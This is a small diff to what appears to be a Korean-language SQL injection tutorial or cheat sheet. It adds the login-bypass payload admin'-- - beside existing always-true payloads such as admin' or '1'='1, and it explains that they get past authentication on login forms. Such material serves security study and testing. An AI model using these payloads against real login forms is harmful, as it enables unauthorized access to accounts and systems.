@@ -45,6 +45,8 @@ admin' || '1'=='1//
 로그인 폼에서 항상 참인 조건을 만들어 인증을 우회합니다.
 
 ```sql
+admin'-- -
+
 # OR '1'='1' 구문을 이용한 항상 참 조건 생성
 # 결과: WHERE username='admin' OR '1'='1' AND password='password' OR '1'='1'
 username : admin' or '1'='1
